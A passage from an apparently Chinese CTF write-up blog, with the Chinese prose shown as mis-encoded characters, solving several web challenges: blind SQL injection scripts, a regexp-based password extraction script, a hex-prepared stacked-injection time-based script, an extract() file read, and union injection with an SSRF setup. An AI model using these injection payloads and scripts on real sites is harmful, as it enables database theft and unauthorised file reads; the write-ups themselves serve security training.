<p>å‡è®¾flagä¸ºflag{bbbbb}ï¼Œå¯¹äºpayloadè¿™ä¸ªä¸¤ä¸ªselectæŸ¥è¯¢çš„æ¯”è¾ƒï¼Œæ˜¯æŒ‰ä½æ¯”è¾ƒçš„ï¼Œå³å…ˆæ¯”ç¬¬ä¸€ä½ï¼Œå¦‚æœç›¸ç­‰åˆ™æ¯”ç¬¬äºŒä½ï¼Œä»¥æ­¤ç±»æ¨ï¼›åœ¨æŸä¸€ä½ä¸Šï¼Œå¦‚æœå‰è€…çš„ASCIIå¤§ï¼Œä¸ç®¡æ€»é•¿åº¦å¦‚ä½•ï¼ŒASCIIå¤§çš„åˆ™å¤§ï¼Œè¿™ä¸ªä¸éš¾æ‡‚ï¼Œå’Œcè¯­è¨€çš„<code>strcmp()</code>å‡½æ•°åŸç†ä¸€æ ·ï¼Œä¸¾å‡ ä¸ªä¾‹å­ï¼š</p>
<ul>
<li>glag &gt; flag{bbbbb}</li>
<li>alag{zzzzzzzzzzz} &lt; flag{bbbbb}</li>
<li>a &lt; flag{bbbbb}</li>
<li>z &gt; flag{bbbbb}</li>
</ul>
<p>åœ¨è¿™æ ·çš„æŒ‰ä½æ¯”è¾ƒè¿‡ç¨‹ä¸­ï¼Œå› ä¸ºåœ¨é‡Œå±‚çš„<code>for()</code>å¾ªç¯ï¼Œå­—å…¸é¡ºåºæ˜¯ä»ASCIIç å°åˆ°å¤§æ¥æšä¸¾å¹¶æ¯”è¾ƒçš„ï¼Œå‡è®¾æ­£ç¡®å€¼ä¸ºbï¼Œé‚£ä¹ˆå­—å…¸è·‘åˆ°bçš„æ—¶å€™b=bä¸æ»¡è¶³payloadçš„å¤§äºå·ï¼Œåªèƒ½ç»§ç»­ä¸‹ä¸€è½®å¾ªç¯ï¼Œc&gt;bæ­¤æ—¶æ»¡è¶³äº†ï¼Œé¢˜ç›®è¿”å›çœŸï¼Œå‡ºç°äº†Nu1Lå…³é”®å­—ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦è®°å½•flagçš„å€¼äº†ï¼Œä½†æ˜¯æ­¤æ—¶è¿™ä¸€ä½çš„charæ˜¯cï¼Œè€ŒçœŸæ­£çš„flagçš„è¿™ä¸€ä½åº”è¯¥æ˜¯bæ‰å¯¹ï¼Œæ‰€ä»¥<code>flag += chr(char-1)</code>ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨å­˜flagæ—¶å€™è¦å¾€å‰åç§»ä¸€ä½çš„åŸå› ã€‚</p>
<p>å¦å¤–è¿˜éœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œå­—æ®µæ•°ä¸€å®šæ˜¯ä¸€ä¸€åŒ¹é…ï¼Œè¿™é‡Œf1ag_1s_h3r3_hhhhhæ˜¯æœ‰ä¸¤ä¸ªå­—æ®µçš„(å¯ä»¥ç”¨select 1|select 1,2|select 1,2,3è¯•ä¸€è¯•)ï¼ŒçŸ¥é“æ˜¯ä¸¤ä¸ªå­—æ®µåï¼Œè¿˜è¦æ³¨æ„å­—æ®µå†…çš„ä¸€ä¸€å¯¹åº”ï¼Œf1ag_1s_h3r3_hhhhhè¡¨ä¸­çš„flagåœ¨ç¬¬äºŒä¸ªå­—æ®µã€‚</p>
<p>ç›´æ¥show codeï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://98ef5288-1d34-4680-a03c-1aa5f5fbfaad.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Nu1L&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;2||(select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        char = result + chr(j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(char)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(URL, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            result += chr(j - <span class="number">1</span>)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥æˆåŠŸçš„æ‹¿åˆ°flagã€‚</p>
<h2 id="GXYCTF2019-BabysqliV3">GXYCTF2019 BabysqliV3</h2>
<h2 id="NCTF2019-SQLi">NCTF2019 SQLi</h2>
<h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3>
<ul>
<li>regexç›²æ³¨</li>
</ul>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/8003">REGEXPæ³¨å…¥ä¸LIKEæ³¨å…¥</a></p>
<h3 id="è§£é¢˜-v10">è§£é¢˜</h3>
<p>hint.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°adminçš„å¯†ç å³å¯å¾—flag</p>
<p>ç”±äºå•å¼•å·è¢«ç¦ç”¨ï¼Œä½¿ç”¨ \ è½¬ä¹‰andå‰é¢çš„é‚£ä¸ªå•å¼•å·ï¼Œä½¿å¾— <code>'\' and passwd='</code> å½¢æˆé—­åˆã€‚æ„é€ passwdå¤„ä¸º <code>||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>ï¼Œç”¨regexpæŸ¥è¯¢passwd ^åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´ %00æˆªæ–­åé¢çš„å†…å®¹ã€‚ä½†æ˜¯ä¸èƒ½åœ¨è¾“å…¥æ¡†ç›´æ¥æäº¤ï¼Œä¼šè¢«url encode å˜ä¸º%2500è¢«é»‘åå•æ‹¦æˆªã€‚</p>
<p>æŸ¥è¯¢è¯­å¥å˜ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;\&#39; and passwd&#x3D;&#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^a&quot;;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœregexä¸ºçœŸçš„è¯ï¼Œä¼šè¿”å›404ï¼Œå¦åˆ™è·³è½¬è‡³ç™»å½•ç•Œé¢ã€‚</p>
<p>ç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://aabb7aa1-f68f-44c7-9e75-514410c6d6f2.node3.buuoj.cn/index.php&#x27;&#x27;&#x27;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">strs = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> strs:</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.format(passwd+m, parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">404</span>:</span><br><span class="line">            passwd += m</span><br><span class="line">            print(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(passwd)</span><br></pre></td></tr></table></figure>
<h2 id="SWPUCTF2019-web1">SWPUCTF2019 web1</h2>
<h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3>
<ul>
<li>åå…­è¿›åˆ¶+MySQLé¢„ç¼–è¯‘ç»•è¿‡</li>
<li>PHPä»£ç å®¡è®¡</li>
</ul>
<h3 id="è§£é¢˜-v11">è§£é¢˜</h3>
<p>é¢˜ç›®åªæœ‰ä¸€ä¸ªç™»å½•æ¡†ï¼Œæ³¨å†ŒåŠŸèƒ½æœªå¼€æ”¾ï¼Œéšæ„å¡«å†™å†…å®¹ï¼Œç‚¹å‡»ç™»å½•ï¼ŒæŠ“åŒ…</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816090843.png" alt=""></p>
<p>åœ¨usernameå­—æ®µæ·»åŠ ä¸€ä¸ªå•å¼•å·PHPä¼šæŠ¥é”™</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816090948.png" alt=""></p>
<p>è€Œé—­åˆå¼•å·åä¼šæ­£å¸¸æ˜¾ç¤ºã€‚å› æ­¤å¯å¤§è‡´ç¡®å®šæ³¨å…¥å­˜åœ¨ï¼Œéšåå¼€å§‹æ„é€ payloadã€‚ç”±äºé¢˜ç›®å¯¹usernameè¿›è¡Œäº†ä¸¥æ ¼çš„æ£€æµ‹ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨å•è¯­å¥è¿›è¡Œæ³¨å…¥ï¼Œä½†æ˜¯æ³¨å…¥ç‚¹åˆå­˜åœ¨ï¼Œäºæ˜¯å¯ä»¥å°è¯•è¿›è¡Œå †å æ³¨å…¥ã€‚</p>
<p>ä¸è¿‡è²Œä¼¼è¿‡æ»¤äº†ç»å¤§å¤šæ•°çš„å…³é”®å­—ï¼Œé‡‡ç”¨16è¿›åˆ¶+MySQLé¢„å¤„ç†ç»•è¿‡ã€‚åŸç†å¦‚ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816091925.png" alt=""></p>
<p>ç¼–å†™æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://71c8375e-74ff-45aa-a2ee-8670864f6b0b.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>: payloads.format(str_to_hex(payload.format(i, j))), <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([hex(ord(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>æœ€åè·‘å‡ºäº†ä¸€ä¸ªæºä»£ç ï¼Œè¿›è¡Œå®¡è®¡ã€‚</p>
<p>æ—¢ç„¶æ˜¯MVCæ¶æ„ï¼Œå…ˆå¼„æ¸…æ¥šè·¯ç”±</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;r&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$r = explode(<span class="string">&#x27;/&#x27;</span>, $_REQUEST[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line">	<span class="keyword">list</span>($controller,$action) = $r;</span><br><span class="line">	$controller = <span class="string">&quot;<span class="subst">&#123;$controller&#125;</span>Controller&quot;</span>;</span><br><span class="line">	$action = <span class="string">&quot;action<span class="subst">&#123;$action&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(class_exists($controller))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(method_exists($controller,$action))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			$action = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$controller = <span class="string">&quot;LoginController&quot;</span>;</span><br><span class="line">        $action = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    $data = call_user_func(<span class="keyword">array</span>( (<span class="keyword">new</span> $controller), $action));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location:index.php?r=Login/Index&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»rå‚æ•°ä¸­è·å–è¦è®¿é—®çš„Controllerä»¥åŠAction,ç„¶åä»¥/åˆ†éš”å¼€åæ‹¼æ¥æˆå®Œæ•´çš„æ§åˆ¶å™¨åã€‚ä»¥Login/Indexä¸ºä¾‹ï¼Œå°±æ˜¯å°†Login/Indexåˆ†éš”å¼€åˆ†åˆ«æ‹¼æ¥æˆLoginControllerä»¥åŠactionIndex,ç„¶åè°ƒç”¨LoginControllerè¿™ä¸ªç±»ä¸­çš„actionIndexæ–¹æ³•ã€‚æ¯ä¸ªactioné‡Œé¢ä¼šè°ƒç”¨å¯¹åº”çš„loadView()æ–¹æ³•è¿›è¡Œæ¨¡ç‰ˆæ¸²æŸ“ï¼Œç„¶åå°†é¡µé¢è¿”å›ç»™å®¢æˆ·ç«¯ã€‚è‹¥è®¿é—®çš„Controllerä¸å­˜åœ¨åˆ™é»˜è®¤è§£æLogin/Indexã€‚</p>
<p>ä¸‹é¢çœ‹å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params">$viewName =<span class="string">&#x27;&#x27;</span>, $viewData = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">   &#123;</span><br><span class="line">      extract($viewData);</span><br><span class="line">      <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾å¯ä»¥é€šè¿‡extractæ¥è¦†ç›–å˜é‡ï¼Œä¸è¿‡ç°åœ¨è¿˜ä¸çŸ¥é“éœ€è¦è¦†ç›–ä»€ä¹ˆå˜é‡ï¼Œå¯»æ‰¾å‡ ä¸ªè°ƒç”¨loadViewçš„æ–¹æ³•ï¼Œå‘ç°ä¸€ä¸ªå¯¹<code>$viewData</code>å®Œå…¨å¯æ§çš„åœ°æ–¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listData = $_REQUEST;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadView(<span class="string">&#x27;userIndex&#x27;</span>,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$listData</code>æ˜¯ä»REQUESTæå–å‡ºæ¥çš„ï¼Œå®Œå…¨å¯æ§ã€‚è€Œå…¶å¯¹åº”çš„/View/userIndex.phpä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶è¯»å–ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>($img_file)) &#123;</span><br><span class="line">     $img_file = <span class="string">&#x27;/../favicon.ico&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">$img_dir = dirname(<span class="keyword">__FILE__</span>) . $img_file;</span><br><span class="line">$img_base64 = imgToBase64($img_dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ï¼Œ<code>$img_file</code>å¯é€šè¿‡<code>extract($viewData)</code>å˜é‡è¦†ç›–æ¼æ´å®Œå…¨æ§åˆ¶ï¼Œè€Œ<code>$viewData</code>æ˜¯å—ç”¨æˆ·æ§åˆ¶çš„å®Œå…¨æ§åˆ¶çš„ã€‚æ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚</p>
<p>æ‰€ä»¥è®¿é—®<code>?r=User/Index&amp;img_file=/../flag.php</code>å¯ç›´æ¥è·å–flag.phpç»base64åçš„å†…å®¹ã€‚</p>
<h2 id="å¼ºç½‘æ¯2019-Fakebook">å¼ºç½‘æ¯2019 Fakebook</h2>
<h3 id="è€ƒç‚¹-v12">è€ƒç‚¹</h3>
<ul>
<li>æºç æ³„éœ²</li>
<li>SQLæ³¨å…¥</li>
<li>PHPååºåˆ—åŒ–</li>
<li>SSRF</li>
</ul>
<h3 id="é¢˜è§£">é¢˜è§£</h3>
<p>æœ‰robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure>
<p>è®¿é—®ä¸€ä¸‹æ‹¿åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€çœ¼çœ‹ä¸Šå»å°±å¾ˆåƒæ˜¯SSRFæ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯å§‹ç»ˆç»•ä¸è¿‡<code>isValidBlog</code>å‡½æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼</p>
<p>èµ°ä¸€ä¸‹ç½‘ç«™çš„æµç¨‹</p>
<p>æ³¨å†Œäº†è´¦å·</p>
<p>è®¿é—®ä¸ªäººç•Œé¢æ—¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:53095&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥no=9</p>
<p>æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œæ³„éœ²äº†ç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Notice: Trying to get property of non-object in &#x2F;var&#x2F;www&#x2F;html&#x2F;view.php on line 53</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰sqlæ³¨å…¥ï¼Œæ‰‹å·¥æ³¨å¤±è´¥äº†ï¼Œæœ‰wafã€‚</p>
<p>çœ‹äº†ä¸€ä¸‹å¸ˆå‚…ä»¬çš„wp,å‘ç°æ˜¯wafæŠŠunion selectç»™è¿‡æ»¤äº†ï¼Œç”¨/**/å†…è”æ³¨é‡Šæ¥ç»•è¿‡ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620150734.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#çˆ†è¡¨</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database() </span><br><span class="line">#çˆ†åˆ—</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema&#x3D;database()</span><br><span class="line">#çˆ†åˆ—dataçš„å†…å®¹</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(data),3,4 from users</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620151058.png" alt=""></p>
<p>dataé‡Œçš„å†…å®¹å°±æ˜¯æˆ‘ä»¬ä¹‹å‰æ³¨å†Œç”¨æˆ·çš„åºåˆ—åŒ–æ•°æ®ï¼ŒæŠ¥é”™ä¿¡æ¯æš—ç¤ºæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unserialize(): Error at offset 0 of 1 bytes in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php&lt;&#x2F;b&gt; on line 31</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæäº¤äº†ä¸€ä¸ªnoçš„å‚æ•°ï¼Œè¿”å›äº†ç”¨æˆ·ä¿¡æ¯è¿™ä¸ªé¡µé¢ï¼Œæ‰€ä»¥ä¸éš¾çŒœåˆ°æœåŠ¡å™¨ç«¯æ˜¯é€šè¿‡åˆ†ænoå‚æ•°ï¼Œå†ä»æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åè¿”å›æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œä¹‹å‰sqlæ³¨å…¥æ—¶å¾—åˆ°äº†æœåŠ¡å™¨å†æŸ¥è¯¢æ—¶æ˜¯æŸ¥è¯¢äº†4ä¸ªå­—æ®µï¼Œè€Œæˆ‘ä»¬å¾—åˆ°çš„å¯ç”¨çš„å­—æ®µæœ‰[no,username,passwd,data]å››ä¸ªå­—æ®µã€‚</p>
<p>æ¯‹åº¸ç½®ç–‘çš„æ˜¯æˆ‘ä»¬çš„æ³¨å†Œä¿¡æ¯æ˜¯å†™å…¥äº†æ•°æ®åº“çš„ï¼Œè€Œno,username,passwdä¸‰ä¸ªå­—æ®µå‡æ²¡æœ‰æˆ‘ä»¬æ³¨å†Œæ—¶å€™å¡«å†™çš„blogåœ°å€ï¼Œåªæœ‰dataå­—æ®µä¸­æœ‰ä¸€ä¸ªåºåˆ—åŒ–åçš„blogå±æ€§çš„å€¼ã€‚é‚£ä¹ˆè¿”å›çš„é¡µé¢ä¸­çš„bolgåœ°å€æ˜¯æ€ä¹ˆæŸ¥è¯¢çš„? æˆ–è€…è¯´æ€ä¹ˆå¾—åˆ°çš„ï¼Ÿå°±æ˜¯é€šè¿‡æŸ¥è¯¢dataå­—æ®µ,å¾—åˆ°å…¶ä¸­çš„åºåˆ—åŒ–ä¿¡æ¯æ¥æ¸²æŸ“æ•´ä¸ªé¡µé¢ï¼Œä»è€Œæ°å¥½å¾—åˆ°é¡µé¢ä¸­çš„username,age,blogå€¼ã€‚</p>
<p>çŒœæƒ³åˆ°è¿™ä¸ªé€»è¾‘ä¹‹å,æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æŸ¥è¯¢çš„åºåˆ—åŒ–å¯¹è±¡çš„å€¼æ¥æ„é€ ssrfè¯·æ±‚,ä»è€Œè¯»å–åˆ°flagæ–‡ä»¶</p>
<p>åˆ©ç”¨å‰é¢æ³„éœ²çš„æºç æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡</p>
